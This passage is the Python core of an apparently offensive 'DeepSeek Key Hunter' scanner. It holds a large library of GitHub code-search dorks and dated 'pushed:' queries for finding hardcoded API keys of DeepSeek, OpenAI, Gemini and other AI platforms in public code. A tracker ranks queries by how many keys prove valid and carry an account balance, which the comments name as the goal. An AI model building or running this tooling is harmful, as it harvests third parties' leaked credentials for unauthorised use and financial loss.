"""
DeepSeek Key Hunter - 扫描引擎核心模块
支持 CLI 和 GUI 两种调用方式
"""

import asyncio
import collections
import fnmatch
import json
import logging
import os
import random
import subprocess
import sys
import threading
import time
import urllib.parse
from collections.abc import Callable
from datetime import datetime

import requests

# Scanner imports for multi-source mode
from scanners.base import KEY_PATTERN
from scanners.base import is_bad_key as _scanner_is_bad_key
from scanners.docker import DockerHubScanner
from scanners.github_commits import CommitsScanner
from scanners.github_events import EventsMonitor
from scanners.github_gist import GistScanner
from scanners.github_issues import IssuesScanner
from scanners.github_raw import GitHubRawScanner
from scanners.gitlab import GitLabScanner
from scanners.huggingface import HuggingFaceScanner
from scanners.npm_registry import NpmScanner
from scanners.paste_sites import PasteSiteScanner

# 结构化诊断日志（独立于 log_callback 叙事；详见 logging_setup）
_logger = logging.getLogger("darkforest.engine")

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# 默认汇率（1 USD = ? CNY）
DEFAULT_USD_CNY_RATE = 7.25

# CLI/watch/engine 共用的源目录。这里只登记当前真实可调度的源；
# 未实现的 Gitee/PyPI/Reddit 等不允许再出现在 --list-sources 中。
GITHUB_SEARCH_SOURCES = frozenset({"github", "github_search"})

AVAILABLE_SOURCES = {
    "github_search": "GitHub Code Search（watch 主源）",
    "github": "GitHub Code Search",
    "gist": "GitHub Gists",
    "issues": "GitHub Issues/PRs",
    "commits": "GitHub 提交历史（全量）",
    "github_commits": "GitHub 提交历史（时间窗口）",
    "gitlab": "GitLab",
    "docker": "Docker Hub",
    "npm": "npm Registry",
    "huggingface": "HuggingFace",
    "paste_sites": "Paste Sites",
    "github_raw": "GitHub Raw（宽泛 sk- 搜索）",
    "github_events": "GitHub PushEvent 实时流",
}

SOURCE_DEFAULT_QUERIES = {
    "github": None,
    "github_search": None,
    "gist": [None],
    "issues": [None],
    "commits": [None],
    "github_commits": [None],
    "gitlab": ["deepseek", "sk- api_key", "deepseek api"],
    "docker": ["deepseek"],
    "npm": ["deepseek", "deepseek-api", "deepseek-proxy", "deepseek-key",
             "deepseek-token", "deepseek-client", "deepseek-config"],
    "huggingface": ["deepseek", "deepseek api", "deepseek proxy",
                    "deepseek free", "deepseek chatbot", "deepseek gradio",
                    "deepseek streamlit", "free endpoint", "api key", "chatbot"],
    "paste_sites": [None],
    "github_raw": [None],
    "github_events": [None],
}

# 统一 key 匹配：覆盖所有已知 AI 平台前缀
# sk- 家族:  DeepSeek/Kimi/Zhipu/StepFun/Baichuan/Yi/SenseNova/Qwen/Doubao (sk-*),
#             Claude (sk-ant-), Qwen Coding (sk-sp-), MiniMax CP (sk-cp-),
#             Kimi Coding (sk-kimi-), OpenRouter (sk-or-v1-)
# 独立前缀:  MiniMax JWT (eyJ...), Xiaomi Token Plan (tp-),
#             Groq (gsk_), Replicate (r8_), HuggingFace (hf_)
# KEY_PATTERN 统一从 scanners.base 导入(单一真相源,顶部已 import)。
# 旧本地复制缺智谱 hex.secret 模式 → github_search 提不出智谱 key,已删。

# ═══════════════════════════════════════════════════════════════════
#  终极查询库 (75条) — 按热度排序 (高产出 → 低产出)
#  基于: 实测数据 + GitGuardian 2025 + TruffleHog + GH Dorking 研究
# ═══════════════════════════════════════════════════════════════════

BUILTIN_QUERIES = [
    # ═══════════════════════════════════════════════════════
    #  🔥 第一梯队 — 实测最高产出 (Java/Kotlin/PHP/Python)
    # ═══════════════════════════════════════════════════════

    # Java (Spring Boot / Android — 实测 90+ keys)
    "deepseek sk- filename:java",
    "deepseek sk- filename:properties",
    "deepseek sk- filename:gradle",

    # Kotlin (Android — 实测 22 keys)
    "deepseek sk- filename:kt",

    # PHP (Web后端 — 实测 26 keys)
    "deepseek sk- filename:php",
    "api.deepseek.com sk- filename:php",

    # Python (AI/ML 代码硬编码)
    "deepseek sk- language:Python NOT env NOT export",
    "deepseek sk- filename:py NOT env",
    "deepseek OpenAI(api_key sk- filename:py",
    "deepseek client sk- filename:py",
    "deepseek def sk- filename:py",
    "deepseek requests sk- filename:py",
    "api.deepseek.com sk- filename:py",

    # ═══════════════════════════════════════════════════════
    #  🔥 第二梯队 — 配置文件泄露 (.env / config)
    # ═══════════════════════════════════════════════════════

    "deepseek sk- filename:env",
    "deepseek sk- filename:env.local",
    "deepseek sk- filename:env.production",
    "deepseek sk- filename:env.development",
    "deepseek sk- filename:env.example",
    "deepseek sk- filename:env.sample",
    "deepseek sk- filename:env.backup",
    "deepseek sk- filename:credentials",
    "deepseek sk- filename:secrets",

    # 配置文件
    "deepseek sk- filename:yml",
    "deepseek sk- filename:yaml",
    "deepseek sk- filename:json",
    "deepseek sk- filename:toml",
    "deepseek sk- filename:cfg",
    "deepseek sk- filename:ini",
    "deepseek sk- filename:conf",
    "deepseek sk- filename:config",

    # ═══════════════════════════════════════════════════════
    #  🔥 第三梯队 — 移动端 (Dart/Swift) + Shell 脚本
    # ═══════════════════════════════════════════════════════

    "deepseek sk- filename:dart",
    "api.deepseek.com sk- filename:dart",

    "deepseek sk- filename:swift",

    "deepseek sk- filename:sh",
    "deepseek sk- filename:zsh",
    "deepseek sk- filename:bash",
    "deepseek sk- filename:fish",

    # ═══════════════════════════════════════════════════════
    #  🔥 第四梯队 — JS/TS + C++ + Go + C#
    # ═══════════════════════════════════════════════════════

    "deepseek sk- filename:js",
    "deepseek sk- filename:ts",
    "deepseek API_KEY sk- filename:js",

    "deepseek sk- filename:cpp",

    "deepseek sk- filename:go",

    "deepseek sk- filename:cs",

    # ═══════════════════════════════════════════════════════
    #  🔥 第五梯队 — Jupyter / Docker / Lua / 变量名
    # ═══════════════════════════════════════════════════════

    "deepseek sk- filename:ipynb",
    "DEEPSEEK_API_KEY sk- filename:ipynb",

    "deepseek sk- filename:dockerfile",
    "deepseek sk- filename:docker-compose",
    "deepseek.com sk- filename:yml path:.github",

    "deepseek sk- filename:lua path:nvim",

    # 变量名变体
    "DEEPSEEK_API_KEY sk-",
    "DEEPSEEK_KEY sk-",
    "deepseek_api_key sk-",
    "deepseek_key sk-",
    "DEEPSEEK_TOKEN sk-",
    "DEEPSEEK_API_TOKEN sk-",

    # ═══════════════════════════════════════════════════════
    #  第六梯队 — API 客户端模式 + 文本文件
    # ═══════════════════════════════════════════════════════

    "api.deepseek.com OpenAI sk-",
    "deepseek Authorization Bearer sk-",
    "deepseek base_url sk-",
    "deepseek OpenAIClient sk-",

    "deepseek sk- filename:txt",
    "deepseek sk- filename:md",

    # ═══════════════════════════════════════════════════════
    #  第七梯队 — 跨文件类型 + 时间限定
    # ═══════════════════════════════════════════════════════

    "deepseek process.env sk- filename:js",
    "deepseek sk- filename:envrc",
    "deepseek sk- filename:html",

    # ═══════════════════════════════════════════════════════
    #  第八梯队 — 小众语言但偶尔有产出
    # ═══════════════════════════════════════════════════════

    "deepseek sk- filename:rb",
    "deepseek sk- filename:rs",
    "deepseek sk- filename:lua",
    "deepseek sk- filename:plist",

    # ═══════════════════════════════════════════════════════
    #  第九梯队 — 时间限定 + 2026 新模式 (v5 实测高产)
    # ═══════════════════════════════════════════════════════

    "deepseek API_KEY sk- language:Java NOT test NOT example",
    "deepseek Authorization sk- language:Python NOT test",
    "deepseek DEEPSEEK_API_KEY sk- language:TypeScript",
    "deepseek base_url sk- filename:json",
    "deepseek sk- path:config",
    "deepseek sk- path:src/main/resources",
    "deepseek sk- filename:application.yml",
    "deepseek sk- filename:application.properties",
    "deepseek sk- path:.github/workflows",
    "api.deepseek.com sk- path:src",
    "deepseek deepseek_api_key sk- filename:env",
    "deepseek Client sk- filename:kt NOT test",
    "deepseek import sk- filename:dart",
    "deepseek OpenAIClient sk- filename:go NOT test",
    "deepseek sk- filename:toml path:config",
    "deepseek Authorization Bearer sk- filename:js NOT test",
    "deepseek process.env.DEEPSEEK sk- filename:ts",

    # ═══════════════════════════════════════════════════════
    #  第十梯队 — 替代平台 + 框架集成 (OpenRouter/LangChain/等)
    # ═══════════════════════════════════════════════════════

    # OpenRouter proxy (people proxy DeepSeek through OpenRouter)
    "OPENROUTER_API_KEY sk-",
    "openrouter deepseek sk-",
    "openrouter api_key sk- filename:py",

    # LangChain integration
    "langchain deepseek api_key",
    "langchain deepseek sk- filename:py",

    # vLLM / open-webui / dify deployment configs
    "vllm deepseek sk- filename:yml",
    "open-webui deepseek sk-",
    "dify deepseek api_key",

    # LLM framework configs
    "llamaindex deepseek sk-",
    "litellm deepseek api_key",

    # CI/CD workflows with hardcoded secrets
    "deepseek sk- path:.github/workflows",
    "DEEPSEEK_API_KEY path:.github/workflows",

    # Keys in README / documentation
    "deepseek sk- filename:README",

    # Terraform / K8s / Helm
    "deepseek sk- filename:tf",
    "deepseek sk- filename:hcl",
    "deepseek sk- path:k8s",
    "deepseek sk- filename:values.yaml",

    # IDE configs
    "deepseek sk- path:.vscode",

    # Package manager configs
    "deepseek sk- filename:.npmrc",
    "deepseek sk- filename:.pypirc",

    # Jupyter / Colab specific
    "deepseek sk- filename:colab",
    "deepseek sk- filename:notebook",

    # Mobile app configs
    "deepseek sk- path:android",
    "deepseek sk- path:ios",

    # Alternative key prefixes (DeepSeek sometimes uses ds-)
    "deepseek ds-",

    # ═══════════════════════════════════════════════════════
    #  第十一梯队 — 更多框架/平台/部署场景
    # ═══════════════════════════════════════════════════════

    # FastGPT / ChatGPT-Next-Web / LobeChat / OneAPI
    "fastgpt deepseek api_key",
    "chatgpt-next-web deepseek sk-",
    "lobechat deepseek sk-",
    "oneapi deepseek sk-",

    # AI agent frameworks
    "autogen deepseek api_key",
    "crewai deepseek api_key",
    "agno deepseek api_key",

    # RAG frameworks
    "ragflow deepseek api_key",
    "quivr deepseek api_key",
    "anythingllm deepseek api_key",

    # API gateway / proxy
    "kong deepseek api_key",
    "apifox deepseek api_key",
    "postman deepseek api_key",

    # Cloud deployment
    "vercel deepseek api_key",
    "netlify deepseek api_key",
    "heroku deepseek api_key",
    "railway deepseek api_key",

    # Serverless functions
    "deepseek sk- path:cloudfunctions",
    "deepseek sk- path:supabase/functions",
    "deepseek sk- path:netlify/functions",

    # More mobile frameworks
    "deepseek sk- filename:xml path:android",
    "deepseek sk- filename:gradle path:android",
    "deepseek sk- filename:plist path:ios",
    "deepseek sk- filename:xcconfig",

    # Game engines
    "deepseek sk- filename:cs path:unity",
    "deepseek sk- filename:gd",

    # More config files
    "deepseek sk- filename:.babelrc",
    "deepseek sk- filename:webpack.config.js",
    "deepseek sk- filename:vite.config.ts",
    "deepseek sk- filename:next.config.js",
    "deepseek sk- filename:nuxt.config.ts",
    "deepseek sk- filename:svelte.config.js",

    # Database / ORM configs
    "deepseek sk- filename:prisma/schema.prisma",
    "deepseek sk- filename:schema.prisma",
    "deepseek sk- filename:supabase/config.toml",

    # Testing configs
    "deepseek sk- filename:cypress.config",
    "deepseek sk- filename:playwright.config",
    "deepseek sk- filename:jest.config",
    "deepseek sk- filename:vitest.config",

    # More shell variants
    "deepseek sk- filename:ps1",
    "deepseek sk- filename:bat",
    "deepseek sk- filename:cmd",

    # WASM / embedded
    "deepseek sk- filename:wasm",
    "deepseek sk- filename:proto",

    # ═══════════════════════════════════════════════════════
    #  第十二梯队 — 深度时间过滤 (2026年最新)
    # ═══════════════════════════════════════════════════════


    # ═══════════════════════════════════════════════════════
    #  第十三梯队 — 变量名变体 + 拼接模式
    # ═══════════════════════════════════════════════════════

    "deepseek_api_key = sk-",
    "deepseek_key = sk-",
    "deepseek_token = sk-",
    "deepseek_secret = sk-",
    "ds_api_key = sk-",
    "ds_key = sk-",

    # process.env variants
    "process.env.DEEPSEEK",
    "process.env[\"DEEPSEEK",
    "os.environ[\"DEEPSEEK",
    "os.getenv(\"DEEPSEEK",

    # Config class patterns
    "class Config deepseek sk-",
    "dataclass deepseek sk-",
    "pydantic deepseek sk-",

    # ═══════════════════════════════════════════════════════
    #  第十四梯队 — API 调用模式
    # ═══════════════════════════════════════════════════════

    "deepseek.chat.completions sk-",
    "deepseek.completions sk-",
    "api.deepseek.com/v1 sk-",
    "api.deepseek.com/chat sk-",

    # Client initialization patterns
    "DeepSeekClient sk-",
    "deepseek.Client sk-",
    "create_deepseek_client sk-",

    # More auth patterns
    "x-deepseek-api-key",
    "deepseek-api-key sk-",

    # ═══════════════════════════════════════════════════════
    #  第十五梯队 — 小众但偶尔有产出
    # ═══════════════════════════════════════════════════════

    "deepseek sk- filename:sql",
    "deepseek sk- filename:graphql",
    "deepseek sk- filename:prisma",
    "deepseek sk- filename:eslintrc",
    "deepseek sk- filename:prettierrc",
    "deepseek sk- filename:babelrc",
    "deepseek sk- filename:postcss.config",
    "deepseek sk- filename:tailwind.config",
    "deepseek sk- filename:astro.config",
    "deepseek sk- filename:gatsby-config",
    "deepseek sk- filename:gridsome.config",
    "deepseek sk- filename:vue.config",
    "deepseek sk- filename:nuxt.config",
    "deepseek sk- filename:quasar.conf",
    "deepseek sk- filename:capacitor.config",
    "deepseek sk- filename:ionic.config",
    "deepseek sk- filename:cordova.config",
    "deepseek sk- filename:electron-main",
    "deepseek sk- filename:tauri.conf",
    "deepseek sk- filename:expo.config",
    "deepseek sk- filename:metro.config",
    "deepseek sk- filename:fastlane",
    "deepseek sk- filename:bitrise.yml",
    "deepseek sk- filename:appveyor.yml",
    "deepseek sk- filename:travis.yml",
    "deepseek sk- filename:circleci",
    "deepseek sk- path:.circleci",
    "deepseek sk- path:.travis",
    "deepseek sk- path:deploy",
    "deepseek sk- path:scripts",
    "deepseek sk- path:tools",
    "deepseek sk- path:infra",
    "deepseek sk- path:infrastructure",
    "deepseek sk- path:terraform",
    "deepseek sk- path:ansible",
    "deepseek sk- path:pulumi",
    "deepseek sk- path:cdk",
]


def generate_rolling_time_queries(base: list = None) -> list:
    """根据历史收益生成高产出文件类型查询 + 补充搜索模式。
    覆盖高产出文件类型、.ipynb（AI key 泄露第一文件）、配置路径、变量名模式。
    返回的列表会追加到静态查询之后。"""
    # 高产出文件类型（基于历史数据分析：env>java>py>js>properties>yml）
    hot_exts = ["env", "java", "py", "js", "yml", "json", "kt", "ts", "go", "php"]
    # 补充：.ipynb（AI key 泄露密度最高）、.properties、.toml、.cfg
    extra_exts = ["ipynb", "properties", "toml", "cfg", "ini"]

    queries = [
        # 宽口径：deepseek 关键词全部结果（sort=indexed 已按最新排序）
        "deepseek sk-",
        # 按高产出文件类型细化
        *[f"deepseek sk- filename:{ext}" for ext in hot_exts],
        *[f"deepseek sk- filename:{ext}" for ext in extra_exts],
        # 配置文件 + 变量名
        "deepseek sk- filename:env",
        "DEEPSEEK_API_KEY sk-",
        "api.deepseek.com sk-",
        # .ipynb 深挖（Jupyter Notebook 是 AI key 泄露密度最高的文件类型）
        "deepseek api_key filename:ipynb",
        "deepseek token filename:ipynb",
        # context 模式：开发者实际硬编码方式
        "Authorization: Bearer sk- deepseek",
        "DEEPSEEK_API_KEY=",
        "deepseek_api_key=",
        # path 限定：高价值目录
        "deepseek sk- path:.github/workflows",
        "deepseek sk- path:src/main/resources",
        "deepseek sk- path:config",
        # 小文件限定（config 文件更可能含硬编码 key）
        "deepseek sk- filename:env size:<5000",
        "deepseek sk- filename:yml size:<10000",
        "deepseek sk- filename:properties size:<5000",
        # 多平台变体
        "kimi sk- filename:env",
        "qwen sk- filename:env",
        "zhipu sk- filename:env",
        "doubao sk- filename:env",
    ]
    # 去重保序
    seen = set()
    out = []
    for q in queries:
        if q not in seen:
            seen.add(q)
            out.append(q)
    return out


def build_active_queries(base: list = None) -> list:
    """构建完整查询集：优先从 queries_optimized.txt 加载，回退到 BUILTIN_QUERIES。
    动态注入滚动时间窗口（7天/30天/90天），聚焦最近活跃的泄露。"""
    # 优先使用优化后的查询文件
    optimized_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "queries_optimized.txt")
    if base is None and os.path.exists(optimized_path):
        base = []
        with open(optimized_path, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    base.append(line)
    elif base is None:
        base = BUILTIN_QUERIES

    # 动态生成滚动时间窗口查询（pushed:>YYYY-MM-DD）
    from datetime import datetime, timedelta
    now = datetime.now()
    d7 = (now - timedelta(days=7)).strftime("%Y-%m-%d")
    d30 = (now - timedelta(days=30)).strftime("%Y-%m-%d")
    d90 = (now - timedelta(days=90)).strftime("%Y-%m-%d")

    time_queries = [
        f"deepseek sk- pushed:>{d7}",
        f"deepseek sk- pushed:>{d30}",
        f"deepseek sk- filename:env pushed:>{d7}",
        f"deepseek sk- filename:py pushed:>{d7}",
        f"deepseek sk- filename:java pushed:>{d7}",
        f"deepseek sk- filename:js pushed:>{d7}",
        f"DEEPSEEK_API_KEY sk- pushed:>{d30}",
        f"api.deepseek.com sk- pushed:>{d30}",
        f"deepseek sk- pushed:>{d90}",
        # 第二批平台新鲜度 (v2.4.0, 2026-09)：OpenAI 泄露量最大优先周级窗口；
        # 只用专有前缀/语境词（不带日期的版本在 queries_optimized.txt 静态库）
        f"sk-proj- pushed:>{d7}",
        f"OPENAI_API_KEY sk-proj- pushed:>{d7}",
        f"sk-proj- filename:env pushed:>{d7}",
        f"GEMINI_API_KEY AIza pushed:>{d7}",
        f"nvapi- pushed:>{d7}",
        f"bce-v3 pushed:>{d30}",
    ]

    # 过滤掉硬编码的过期日期查询，保留动态生成的
    # 策略：移除含 pushed: 的旧查询，用动态时间窗口替代
    filtered = []
    for q in base:
        if "pushed:" in q:
            continue  # 旧的硬编码日期查询全部移除，用动态版本替代
        filtered.append(q)

    # 高产出文件类型查询 + 动态时间窗口 + 去重保序
    seen = set()
    out = []
    for q in filtered + generate_rolling_time_queries() + time_queries:
        if q not in seen:
            seen.add(q)
            out.append(q)
    return out


class QueryTracker:
    """追踪每条查询的产出（发现的 key 数），用于下次运行时排序。
    数据持久化到 query_stats.json。"""

    def __init__(self, stats_path: str = None):
        self._path = stats_path or os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "results", "query_stats.json")
        self._stats = {}  # {query: {"hits": int, "runs": int, "last_hit": str}}
        # record 被 N 个 token 线程并发调用:hits+=/recent 读改写需互斥
        self._record_lock = threading.Lock()
        # P1-2: 收益递减冷却追踪
        # is_barren = 查询本身无结果（total==0）
        # diminishing = 查询有结果但全部在 _seen 中（total>0, new==0）→ 旧查询，冷却
        self._round_counts: dict[str, collections.deque] = {}  # per-query (new, total) 滑动窗口
        self._cooldown: dict[str, int] = {}  # {query: 剩余冷却轮数}
        self._cooldown_rounds = 20  # 冷却持续轮次数
        # 锁在 __init__ 显式创建:record_outcome 的 hasattr 惰性创建是 check-then-set,
        # 并发首调可能各持一把锁(实测仅测试用 __new__ 绕过 __init__ 时可达,但没必要留险)
        self._record_lock = threading.Lock()
        self._decay_tick = 0
        self._load()

    def _load(self):
        try:
            if os.path.exists(self._path):
                with open(self._path, encoding="utf-8") as f:
                    self._stats = json.load(f)
        except Exception as e:
            # 损坏文件静默清零曾让全部收益学习无声丢失——至少留一条诊断
            _logger.warning("query stats 加载失败,收益学习从零开始: %s",
                            type(e).__name__)
            self._stats = {}

    def save(self):
        os.makedirs(os.path.dirname(self._path), exist_ok=True)
        try:
            # 快照后转储:验证 worker 的 record_outcome 会向 _stats 插入新键,
            # 直接 dump 迭代中的 dict 会 "dictionary changed size during iteration"
            # 被这里 except 吞掉 → query_stats.json 静默停更(收益学习全丢)。
            # (锁可能缺席:部分测试用 __new__ 绕过 __init__ 构造)
            lock = getattr(self, "_record_lock", None)
            if lock is not None:
                lock.acquire()
            try:
                snapshot = json.loads(json.dumps(self._stats))
            finally:
                if lock is not None:
                    lock.release()
            # 原子写:同目录临时文件 + 原子替换。watch 看门狗自愈用 os._exit(0)
            # 硬退(不跑 atexit/finally),落在 dump 中途会留下截断 JSON——非原子写
            # 会让下次启动 _load 解析失败、全部统计清零。
            # 临时文件名由 tempfile 在同目录生成(无手拼路径),目标为构造方传入
            # 的固定 results/ 路径。
            import tempfile
            fd, tmp_name = tempfile.mkstemp(
                dir=os.path.dirname(os.path.abspath(self._path)) or ".",
                suffix=".tmp")
            try:
                with os.fdopen(fd, "w", encoding="utf-8") as f:
                    json.dump(snapshot, f, ensure_ascii=False, indent=2)
                os.replace(tmp_name, self._path)
            except Exception:
                try:
                    os.unlink(tmp_name)
                except OSError:
                    pass
                raise
        except Exception:
            pass

    def record(self, query: str, key_count: int):
        """记录一条查询的产出(线程安全:watch 模式 N token 并发调用)。"""
        # 惰性锁:部分测试用 __new__ 绕过 __init__ 构造
        if not hasattr(self, "_record_lock"):
            self._record_lock = threading.Lock()
        with self._record_lock:
            if query not in self._stats:
                self._stats[query] = {"hits": 0, "runs": 0, "last_hit": "", "recent": []}
            s = self._stats[query]
            s["runs"] += 1
            s["hits"] += key_count
            # 近 10 轮产出历史（is_barren 判据：近 N 轮 0 产出 → 跳过）
            s["recent"] = (s.get("recent", []) + [key_count])[-10:]
            if key_count > 0:
                s["last_hit"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def get_runs(self, query: str) -> int:
        """获取查询已执行的轮次数（0=从未跑过）。"""
        s = self._stats.get(query)
        return s["runs"] if s else 0

    def record_outcome(self, query: str, *, valid: bool, high_value: bool,
                       value_capable: bool = True):
        """记录验证后的质量结果，驱动查询从“候选量”走向“有效产出”。"""
        if not hasattr(self, "_record_lock"):
            self._record_lock = threading.Lock()
        with self._record_lock:
            s = self._stats.setdefault(query, {})
            s.setdefault("hits", 0)
            s.setdefault("runs", 0)
            s.setdefault("last_hit", "")
            s.setdefault("recent", [])
            s["validated"] = s.get("validated", 0) + 1
            s["valid_hits"] = s.get("valid_hits", 0) + int(bool(valid))
            s["value_capable_valid_hits"] = (
                s.get("value_capable_valid_hits", 0)
                + int(bool(valid) and bool(value_capable))
            )
            s["hv_hits"] = s.get("hv_hits", 0) + int(bool(high_value))

    def get_yield(self, query: str) -> float:
        """获取查询的历史收益率（hits/runs）。"""
        s = self._stats.get(query)
        if not s or s["runs"] == 0:
            return 0.5  # 未知查询给中等优先级
        return s["hits"] / s["runs"]

    def get_quality_yield(self, query: str) -> float:
        """按有效/高价值转化折算收益；无验证反馈时保留保守原始权重。"""
        s = self._stats.get(query)
        if not s or s.get("runs", 0) == 0:
            return 0.5
        raw = s.get("hits", 0) / s["runs"]
        validated = s.get("validated", 0)
        if validated <= 0:
            return raw * 0.5
        valid_rate = self._effective_valid_rate(s)
        hv_rate = s.get("hv_hits", 0) / validated
        capability_factor = (1.0 if s.get("value_capable_valid_hits", 0) > 0
                             else 0.25)
        # 高价值信号权重显著大于普通 valid：目标是余额产出，不是刷候选数。
        return raw * (0.1 + 2.0 * valid_rate + 20.0 * hv_rate) * capability_factor

    @staticmethod
    def _effective_valid_rate(stats: dict) -> float:
        """可判余额的 valid 全权重；无余额接口的 valid 只保留探索价值。"""
        validated = stats.get("validated", 0)
        if validated <= 0:
            return 0.0
        valid_hits = stats.get("valid_hits", 0)
        capable = min(valid_hits, stats.get("value_capable_valid_hits", 0))
        unverifiable = max(0, valid_hits - capable)
        # 0.1 是探索保留权重：无余额接口的 key 可能仍可用，但不能和
        # 可直接验证余额的 key 等权参与“高价值”排序。
        return (capable + 0.1 * unverifiable) / validated

    def sort_by_yield(self, queries: list) -> list:
        """按质量收益降序排列查询（候选量 × 有效/高价值转化）。"""
        # declining 不删除，但排到最后：保留一次复测机会，不占用变异优先级。
        return sorted(
            queries,
            key=lambda q: (not self.is_declining(q), self.get_quality_yield(q)),
            reverse=True,
        )

    def suggest_pages(self, query: str, default: int = 5) -> int:
        """根据历史产出建议搜索页数（最多 10 页 = Code Search 1000 条上限）。

        注意：返回的是**独立建议**，调用处再与基础页数取 max——
        不能用 min(default, ...) 钳制，否则 default=1（--github-pages 默认）
        时深挖永远失效（高产查询恒 1 页，2f89962 的深挖从未生效）。"""
        s = self._stats.get(query)
        if not s or s["runs"] == 0:
            return default  # 未知查询用默认页数
        avg_hits = s["hits"] / s["runs"]
        if avg_hits >= 3:
            return 10  # 高产查询：深挖到 1000 条上限
        elif avg_hits >= 1:
            return 5  # 中等查询：5 页
        else:
            return 1  # 低产查询：1 页

    def is_barren(self, query: str, min_runs: int = 2) -> bool:
        """True if query has produced 0 new keys in the recent N runs.

        两种枯竭判据（任一命中即跳过）：
        1. 提取=0 连续 2 轮（查询本身无结果）
        2. **提取>0 但新提交=0 连续 2 轮**（结果全在 _seen 去重集里——
           历史 key 反复提取，提交恒 0。修复：原逻辑只看提取数，
           提取恒>0 → 永不跳过 → 每轮重复提取历史 key，长期 0 提交。）
        """
        s = self._stats.get(query)
        if not s or s.get("runs", 0) < min_runs:
            return False
        # 判据 1：提取=0
        recent = s.get("recent", [])
        if len(recent) >= 2 and all(h == 0 for h in recent[-2:]):
            return True
        # 判据 2：提取>0 但新提交=0（diminishing rounds 窗口里查）
        dq = self._round_counts.get(query)
        if dq and len(dq) >= 2:
            last2 = list(dq)[-2:]
            if all(new == 0 and total > 0 for new, total in last2):
                return True
        return False

    def is_declining(self, query: str, min_runs: int = 2) -> bool:
        """最近一轮从有产出跌到 0；可用于排除变异种子，但不必立即禁扫。"""
        s = self._stats.get(query)
        if not s or s.get("runs", 0) < min_runs:
            return False
        recent = s.get("recent", [])
        return bool(recent) and recent[-1] == 0 and any(h > 0 for h in recent[:-1])

    def is_low_quality(self, query: str, min_validated: int = 10,
                       max_valid_rate: float = 0.05) -> bool:
        """验证反馈驱动的熔断：样本足够、零高价值且有效转化极低时跳过。

        阈值故意保守：`valid_no_balance` 仍有发现价值，只有长期几乎全无效
        的查询才让出 Code Search 预算。未验证过的探索查询永远保留。
        """
        s = self._stats.get(query)
        if not s:
            return False
        validated = s.get("validated", 0)
        if validated < min_validated:
            return False
        if s.get("hv_hits", 0) > 0:
            return False
        return self._effective_valid_rate(s) <= max_valid_rate

    def top_queries(self, n: int = 10, min_runs: int = 2) -> list[tuple[str, float]]:
        """返回历史收益最高的 n 条查询 (query, yield)，仅含 runs≥min_runs 且 hits>0。
        供查询变异引擎据此派生变体（高产模式自我扩展）。"""
        cands = [(q, self.get_quality_yield(q)) for q, s in self._stats.items()
                 if s.get("runs", 0) >= min_runs and s.get("hits", 0) > 0
                 and not self.is_declining(q)]
        cands.sort(key=lambda x: x[1], reverse=True)
        return cands[:n]

    def is_in_cooldown(self, query: str) -> bool:
        """True if query is in diminishing-returns cooldown."""
        return self._cooldown.get(query, 0) > 0

    def tick_cooldowns(self):
        """Decrement all cooldown counters by 1 (call once per round).

        全程持 _record_lock：本方法在 source_worker 线程执行，验证 worker 可同时
        record_outcome 向 _stats 插入新键——无锁迭代 _stats.values() 会抛
        "dictionary changed size during iteration"（本文件其他 _stats 写路径
        都持锁，唯独这里曾破例）。"""
        with self._record_lock:
            expired = [q for q, c in self._cooldown.items() if c <= 1]
            for q in expired:
                del self._cooldown[q]
            for q in list(self._cooldown):
                self._cooldown[q] -= 1
            # v2.4.3: 质量熔断衰减——每 32 轮把 validated 减半。is_low_quality 是
            # 跨重启的永久熔断(validated 只增不减,还排除在灭绝保护恢复批之外),
            # 平台侧一次 WAF 误判潮(如 403→invalid)会永久封死高产查询且无解。
            # 减半后低质查询约几小时~1天掉回 min_validated 以下重获探索机会;
            # 若仍旧是垃圾会再次熔断,预算损失有限。
            self._decay_tick += 1
            if self._decay_tick % 32 == 0:
                for s in self._stats.values():
                    if s.get("validated", 0) > 0:
                        s["validated"] = s["validated"] // 2

    def diminishing_rounds(self, query: str, new_count: int, total_count: int) -> bool:
        """Track per-query (new_submitted, total_extracted) sliding window.
        If recent rounds show lots of extraction but near-zero new submissions,
        the query is stale (keys all in _seen). Put it on cooldown.

        Returns True if cooldown was triggered this call.
        Different from is_barren: barren=total==0, diminishing=total>0 but new==0."""
        dq = self._round_counts.setdefault(query, collections.deque())
        dq.append((new_count, total_count))
        # Keep last 5 rounds
        while len(dq) > 5:
            dq.popleft()
        if len(dq) < 4:
            return False
        avg_new = sum(n for n, _ in dq) / len(dq)
        avg_total = sum(t for _, t in dq) / len(dq)
        # 阈值 0.5:avg_new<2 会把"1 新 key/轮"的边缘高产查询冷藏 20 轮
        # (~4 小时)——当前泄露源已饱和,1 新 key/轮的查询就是优质资产。
        # 只有完全零产出(或接近零)才冷却。
        if avg_new < 0.5 and avg_total > 10:
            self._cooldown[query] = self._cooldown_rounds
            return True
        return False


def load_tiered_queries(filepath: str = "queries_optimized.txt") -> list[dict]:
    """Load queries with tier information from a text file.
    Format: tier|query  (e.g. "1|deepseek sk- filename:java")
    也兼容无 tier 前缀的纯查询行（默认按 tier 5 处理，3 页）。
    Returns list of {"tier": int, "query": str, "pages": int}
    """
    tier_pages = {
        1: 5, 2: 5, 3: 5, 4: 5, 5: 5,       # High yield: 5 pages
        6: 3, 7: 3, 8: 3, 9: 3, 10: 3,       # Medium yield: 3 pages
        11: 2, 12: 2, 13: 2,                  # Low yield: 2 pages
        14: 1, 15: 1, 16: 1, 17: 1, 18: 1,   # Experimental: 1 page
        19: 1, 20: 1,
    }
    queries = []
    try:
        with open(filepath, encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "|" in line:
                    parts = line.split("|", 1)
                    try:
                        tier = int(parts[0].strip())
                        query = parts[1].strip()
                        if query:
                            pages = tier_pages.get(tier, 2)
                            queries.append({"tier": tier, "query": query, "pages": pages})
                    except ValueError:
                        pass
                else:
                    # 纯查询行（如 queries_optimized.txt）：默认 tier 5（3 页）
                    queries.append({"tier": 5, "query": line, "pages": tier_pages.get(5, 3)})
    except FileNotFoundError:
        print(f"[scanner_engine] 警告: 查询文件不存在: {filepath}", file=sys.stderr)
    return queries


def get_flat_queries(tiered: list[dict]) -> list[str]:
    """Extract just the query strings from tiered queries."""
